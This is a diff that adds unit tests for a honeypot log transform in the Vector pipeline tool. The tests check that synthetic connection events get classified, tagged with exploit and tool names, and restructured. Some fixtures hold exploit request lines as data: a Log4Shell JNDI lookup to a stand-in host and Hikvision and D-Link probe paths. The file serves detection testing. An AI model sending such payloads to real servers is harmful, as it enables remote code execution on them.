@@ -1,0 +1,359 @@
+# Vector unit tests for vector-sentinel.toml's sentinel_events transform.
+#
+# Fixtures are synthetic, modelled on sentinel.py's JSONL output (the "emit"
+# calls in Sentinel.handle and its protocol handlers), never production data.
+# Addresses are from documentation ranges (RFC 5737 203.0.113.0/24).
+#
+# Run with ./test-vector.sh (sentinel or both). Vector cannot load
+# vector-sentinel.toml and vector.toml together -- the two files each declare
+# their own [sources.*] and [transforms.*] -- so this file only exercises
+# sentinel_events; see vector-tests-collector.toml for hits.
+
+# S1: baseline. A plain SSH connect line in today's format still classifies
+# as a service interaction and names the tool from the SSH banner.
+[[tests]]
+name = "s1_baseline_ssh_connect"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:00:00+00:00","kind":"connect","port":22,"role":"ssh","ip":"203.0.113.5","distinct_ports":1,"first_contact":true,"sweeping":false,"held_ms":120,"hold_ms":0,"spoke":true,"ssh_client":"SSH-2.0-Go","bytes_received":21,"persona":"ubuntu-web"}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(.classification == "service-interaction")
+    assert!(.threat.tool == "go-ssh")
+    '''
+
+# S2: moves. Every flat name from the field-move table lands in its nested
+# home with the same value, and none of the flat names survive. smtp.rcpt
+# keeps both addresses.
+[[tests]]
+name = "s2_field_moves"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:05:00+00:00","kind":"connect","port":25,"role":"smtp","ip":"203.0.113.7","distinct_ports":1,"first_contact":true,"sweeping":false,"held_ms":80,"hold_ms":0,"spoke":true,"tcp_rtt_ms":42.5,"tcp_rttvar_ms":5.25,"tcp_mss":1460,"smtp_helo":"mail.example.com","smtp_mail_from":"a@example.com","smtp_rcpt":["b@example.com","c@example.com"],"smtp_auth_user":"admin","smtp_auth_pass":"hunter2","smtp_starttls":true,"http_host_foreign":true,"bait_served":"aws-keys","bait_credential_used":true,"egress_dst_ip":"198.51.100.9","egress_dst_port":4444,"egress_proto":"tcp","egress_uid":1000,"egress_scope":"container","egress_count":3}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(.network.rtt_ms == 42.5)
+    assert!(.network.rttvar_ms == 5.25)
+    assert!(.network.mss == 1460)
+    assert!(.smtp.helo == "mail.example.com")
+    assert!(.smtp.mail_from == "a@example.com")
+    assert!(array!(.smtp.rcpt) == ["b@example.com", "c@example.com"])
+    assert!(length(array!(.smtp.rcpt)) == 2)
+    assert!(.smtp.auth_user == "admin")
+    assert!(.smtp.auth_pass == "hunter2")
+    assert!(.smtp.starttls == true)
+    assert!(.http.host_foreign == true)
+    assert!(.bait.served == "aws-keys")
+    assert!(.bait.credential_used == true)
+    assert!(.egress.dst_ip == "198.51.100.9")
+    assert!(.egress.dst_port == 4444)
+    assert!(.egress.proto == "tcp")
+    assert!(.egress.uid == 1000)
+    assert!(.egress.scope == "container")
+    assert!(.egress.count == 3)
+    assert!(!exists(.tcp_rtt_ms))
+    assert!(!exists(.tcp_rttvar_ms))
+    assert!(!exists(.tcp_mss))
+    assert!(!exists(.smtp_helo))
+    assert!(!exists(.smtp_mail_from))
+    assert!(!exists(.smtp_rcpt))
+    assert!(!exists(.smtp_auth_user))
+    assert!(!exists(.smtp_auth_pass))
+    assert!(!exists(.smtp_starttls))
+    assert!(!exists(.http_host_foreign))
+    assert!(!exists(.bait_served))
+    assert!(!exists(.bait_credential_used))
+    assert!(!exists(.egress_dst_ip))
+    assert!(!exists(.egress_dst_port))
+    assert!(!exists(.egress_proto))
+    assert!(!exists(.egress_uid))
+    assert!(!exists(.egress_scope))
+    assert!(!exists(.egress_count))
+    '''
+
+# S3: absent. None of the wave-1 fields are present, so none of their parent
+# objects get created either.
+[[tests]]
+name = "s3_fields_absent"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:06:00+00:00","kind":"connect","port":22,"role":"ssh","ip":"203.0.113.8","distinct_ports":1,"first_contact":true,"sweeping":false,"held_ms":10,"hold_ms":0,"spoke":false}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(.classification == "port-confirm")
+    assert!(!exists(.network))
+    assert!(!exists(.smtp))
+    assert!(!exists(.bait))
+    assert!(!exists(.egress))
+    '''
+
+# S4: one needle in a request line, and threat.tool from the user agent
+# survives the exploit assignment that comes after it.
+[[tests]]
+name = "s4_single_needle_keeps_tool"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:07:00+00:00","kind":"connect","port":80,"role":"http","ip":"203.0.113.9","distinct_ports":1,"first_contact":true,"sweeping":false,"held_ms":30,"hold_ms":0,"spoke":true,"http_user_agent":"Mozilla/5.0 zgrab/0.x","http_host":"203.0.113.9","http_requests":["POST /SDK/webLanguage HTTP/1.1"]}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(array!(.threat.exploit) == ["hikvision-cve-2021-36260"])
+    assert!(.threat.tool == "zgrab")
+    '''
+
+# S5: two needles in one event, one from the request line and one from the
+# body, both land in threat.exploit in the order the table lists them.
+[[tests]]
+name = "s5_two_needles"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:08:00+00:00","kind":"connect","port":80,"role":"http","ip":"203.0.113.10","distinct_ports":1,"first_contact":true,"sweeping":false,"held_ms":30,"hold_ms":0,"spoke":true,"http_requests":["GET /HNAP1 HTTP/1.1"],"http_body":"${jndi:ldap://x}"}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(array!(.threat.exploit) == ["dlink-hnap", "log4shell-cve-2021-44228"])
+    '''
+
+# S6: an ordinary request line matches no needle, so threat.exploit is
+# absent rather than an empty array.
+[[tests]]
+name = "s6_no_needle_match"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:09:00+00:00","kind":"connect","port":80,"role":"http","ip":"203.0.113.11","distinct_ports":1,"first_contact":true,"sweeping":false,"held_ms":30,"hold_ms":0,"spoke":true,"http_requests":["GET / HTTP/1.1"]}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(!exists(.threat.exploit))
+    '''
+
+# S7: proxy_probe. CONNECT and an absolute-URI GET both trip it; a path that
+# merely contains "http://" after the leading slash, and a lowercase
+# "connect", do not -- the method is case-sensitive, as HTTP is.
+[[tests]]
+name = "s7_connect_trips_proxy_probe"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:10:00+00:00","kind":"connect","port":80,"role":"http","ip":"203.0.113.12","distinct_ports":1,"first_contact":true,"sweeping":false,"held_ms":30,"hold_ms":0,"spoke":true,"http_requests":["CONNECT example.com:443 HTTP/1.1"]}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(.threat.proxy_probe == true)
+    '''
+
+[[tests]]
+name = "s7_absolute_uri_trips_proxy_probe"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:10:01+00:00","kind":"connect","port":80,"role":"http","ip":"203.0.113.13","distinct_ports":1,"first_contact":true,"sweeping":false,"held_ms":30,"hold_ms":0,"spoke":true,"http_requests":["GET http://example.com/ HTTP/1.1"]}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(.threat.proxy_probe == true)
+    '''
+
+[[tests]]
+name = "s7_embedded_scheme_does_not_trip"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:10:02+00:00","kind":"connect","port":80,"role":"http","ip":"203.0.113.14","distinct_ports":1,"first_contact":true,"sweeping":false,"held_ms":30,"hold_ms":0,"spoke":true,"http_requests":["GET /http://x HTTP/1.1"]}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(!exists(.threat.proxy_probe))
+    '''
+
+[[tests]]
+name = "s7_lowercase_connect_does_not_trip"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:10:03+00:00","kind":"connect","port":80,"role":"http","ip":"203.0.113.15","distinct_ports":1,"first_contact":true,"sweeping":false,"held_ms":30,"hold_ms":0,"spoke":true,"http_requests":["connect x"]}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(!exists(.threat.proxy_probe))
+    '''
+
+# S8: hostile types on the fallible fields. Both transforms run with
+# drop_on_error = true, so each of these proves the event survives rather
+# than vanishing silently.
+[[tests]]
+name = "s8_http_requests_as_string"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:11:00+00:00","kind":"connect","port":80,"role":"http","ip":"203.0.113.16","distinct_ports":1,"first_contact":true,"sweeping":false,"held_ms":10,"hold_ms":0,"spoke":true,"http_requests":"GET / HTTP/1.1"}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(.event.dataset == "tripwire.sentinel")
+    assert!(!exists(.threat.exploit))
+    assert!(!exists(.threat.proxy_probe))
+    '''
+
+[[tests]]
+name = "s8_http_requests_as_null"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:11:01+00:00","kind":"connect","port":80,"role":"http","ip":"203.0.113.17","distinct_ports":1,"first_contact":true,"sweeping":false,"held_ms":10,"hold_ms":0,"spoke":true,"http_requests":null}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(.event.dataset == "tripwire.sentinel")
+    assert!(!exists(.threat.exploit))
+    assert!(!exists(.threat.proxy_probe))
+    '''
+
+[[tests]]
+name = "s8_http_requests_array_holding_a_number"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:11:02+00:00","kind":"connect","port":80,"role":"http","ip":"203.0.113.18","distinct_ports":1,"first_contact":true,"sweeping":false,"held_ms":10,"hold_ms":0,"spoke":true,"http_requests":[404, "GET /HNAP1 HTTP/1.1"]}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    # join() on a mixed-type array errors on the whole array, not just the
+    # bad element (confirmed against the real 0.58.0 binary), so the `?? ""`
+    # a few lines up blanks the entire haystack here -- the string element's
+    # own needle does not get a free pass. The event still is not dropped.
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(.event.dataset == "tripwire.sentinel")
+    assert!(!exists(.threat.exploit))
+    '''
+
+[[tests]]
+name = "s8_http_body_as_object"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:11:03+00:00","kind":"connect","port":80,"role":"http","ip":"203.0.113.19","distinct_ports":1,"first_contact":true,"sweeping":false,"held_ms":10,"hold_ms":0,"spoke":true,"http_body":{"nested":"object"}}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(.event.dataset == "tripwire.sentinel")
+    assert!(!exists(.threat.exploit))
+    '''
+
+# E1: an egress summary from package D. No ip at all; .source.ip must come
+# out null rather than erroring, and the six egress_* fields move.
+[[tests]]
+name = "e1_egress_line"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:12:00+00:00","kind":"egress","egress_dst_ip":"198.51.100.20","egress_dst_port":4444,"egress_proto":"tcp","egress_uid":1000,"egress_scope":"container","egress_count":7}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(.classification == "egress-blocked")
+    assert!(.egress.dst_port == 4444)
+    assert!(.source.ip == null)
+    '''
+
+# E2: the sweep summary still classifies correctly now that the egress
+# branch sits ahead of it in the chain.
+[[tests]]
+name = "e2_sweep_still_detected"
+
+  [[tests.inputs]]
+  insert_at = "sentinel_events"
+  type = "log"
+  log_fields.message = '''{"ts":"2026-09-19T10:13:00+00:00","kind":"sweep","ip":"203.0.113.20","distinct_ports":6,"ports":[22,25,80,443,3306,8080],"note":"touched 6 of 4 open ports within 30s"}'''
+
+  [[tests.outputs]]
+  extract_from = "sentinel_events"
+
+    [[tests.outputs.conditions]]
+    type = "vrl"
+    source = '''
+    assert!(.classification == "sweep-detected")
+    '''
